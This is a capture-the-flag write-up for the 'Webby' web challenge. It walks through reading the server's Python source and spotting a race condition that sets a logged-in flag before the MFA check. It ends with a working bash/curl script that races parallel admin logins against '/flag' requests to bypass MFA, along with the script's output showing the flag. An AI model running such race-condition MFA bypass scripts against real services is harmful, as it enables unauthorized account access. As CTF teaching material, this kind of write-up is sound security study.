# Webby [WEB]

> MFA is awesome! Even if someone gets our login credentials, and they still can't get our secrets! \
> By @gehaxelt

Opening the challenge `http://52.59.124.14:5010/` gives a blank page with username and password inputs.

Opening the source of the page reveals login details.

```html
<html>
  <head>
    <title>Webby</title>
    <!-- user: user1 / password: user1 -->
    <!-- user: user2 / password: user2 -->
    <!-- user: admin / password: admin -->
    <!-- Find me secret here: /?source -->
  </head>
  <body>
    <h1>Webby challenge</h1>
    <form action="/" method="POST">
      <table>
        <tr>
          <th><label for="username">Username</label></th>
          <td><input id="username" name="username" type="text" /></td>
        </tr>
        <tr>
          <th><label for="password">Password</label></th>
          <td><input id="password" name="password" type="password" /></td>
        </tr>
        <tr>
          <th><label for="submit"></label></th>
          <td><button id="submit" name="submit">submit</button></td>
        </tr>
      </table>
    </form>
  </body>
</html>
```

Even though, when we try to login using `admin:admin` credentials, we get hit by a MFA page and we have nothing to solve it.

Other users don't have MFA but have no privilege on the app so they're mostly useless.

## Getting the source

The HTML comment says the source is available at `/?source` but it doesn't work, we have to do `/?source=1`.

```python
import web
import secrets
import random
import tempfile
import hashlib
import time
import shelve
import bcrypt
from web import form
web.config.debug = False
urls = (
  '/', 'index',
  '/mfa', 'mfa',
  '/flag', 'flag',
  '/logout', 'logout',
)
app = web.application(urls, locals())
render = web.template.render('templates/')
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()

def check_user_creds(user,pw):
    users = {
        # Add more users if needed
        'user1': 'user1',
        'user2': 'user2',
        'user3': 'user3',
        'user4': 'user4',
        'admin': 'admin',

    }
    try:
        return users[user] == pw
    except:
        return False

def check_mfa(user):
    users = {
        'user1': False,
        'user2': False,
        'user3': False,
        'user4': False,
        'admin': True,
    }
    try:
        return users[user]
    except:
        return False


login_Form = form.Form(
    form.Textbox("username", description="Username"),
    form.Password("password", description="Password"),
    form.Button("submit", type="submit", description="Login")
)
mfatoken = form.regexp(r"^[a-f0-9]{32}$", 'must match ^[a-f0-9]{32}$')
mfa_Form = form.Form(
    form.Password("token", mfatoken, description="MFA Token"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = login_Form()
        return render.index(f)

    def POST(self):
        f = login_Form()
        if not f.validates():
            session.kill()
            return render.index(f)
        i = web.input()
        if not check_user_creds(i.username, i.password):
            session.kill()
            raise web.seeother('/')
        else:
            session.loggedIn = True
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            #session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
            session.loggedIn = False
            session._save()
            raise web.seeother("/mfa")
        return render.login(session.get("username",None))

class mfa:
    def GET(self):
        if not session.get("doMFA",False):
            raise web.seeother('/login')
        f = mfa_Form()
        return render.mfa(f)

    def POST(self):
        if not session.get("doMFA", False):
            raise web.seeother('/login')
        f = mfa_Form()
        if not f.validates():
            return render.mfa(f)
        i = web.input()
        if i.token != session.get("tokenMFA",None):
            raise web.seeother("/logout")
        session.loggedIn = True
        session._save()
        raise web.seeother('/flag')


class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)


class logout:
    def GET(self):
        session.kill()
        raise web.seeother('/')

application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

We have to call the `/flag` endpoint while being `admin` user to retrieve the challenge flag!

## Searching...

Let's take a look on how the login is done.

```python
def POST(self):
  f = login_Form()
  if not f.validates():
      session.kill()
      return render.index(f)
  i = web.input()
  if not check_user_creds(i.username, i.password):
      session.kill()
      raise web.seeother('/')
  else:
      session.loggedIn = True
      session.username = i.username
      session._save()

  if check_mfa(session.get("username", None)):
      session.doMFA = True
      session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
      session.loggedIn = False
      session._save()
      raise web.seeother("/mfa")
```

See anything? Well it took me some time but there's a race condition in there.

As you can see, once the user credentials are checked, it immediately sets the `loggedIn` variable to `True` **even if the MFA is not checked yet**.

Once the `check_mfa` function is done and tells the script that this user indeed needs MFA verification, it turns back `loggedIn` to `False`.

That would mean if we can perform a request between those two instructions, we could potentially call the `/flag` endpoint!

## Attack

```bash
#!/bin/bash

BASE='http://52.59.124.14:5010'
curl -s -c cookies.txt "$BASE/" >/dev/null

login_once() {
  curl -s -b cookies.txt -c cookies.txt \
       -d 'username=admin&password=admin&submit=' \
       -X POST "$BASE/" >/dev/null
}

get_flag_once() {
  curl -s -L -b cookies.txt "$BASE/flag"
}

for round in $(seq 1 10); do
  # fire 5 admin login requests in background
  for i in $(seq 1 5); do
    login_once &
  done

  # immediately attempt to fetch the flag multiple times
  for j in $(seq 1 5); do
    out="$(get_flag_once)"

    echo "$out" | grep -E 'ENO{.*}' -i && {
      echo "$out"
      exit 0
    }
  done

  wait 2>/dev/null
done
```

Let's run this!

```terminal
$ ./race.sh
<html>
        <head>
                <title>Webby: Flag</title>
        </head>
        <body>
                <h1>Webby: Flag</h1>
                <p>ENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!}</p>
                <a href="/logout">Logout</a>
        </body>
</html>
```

There we have it! This challenge is now solved.
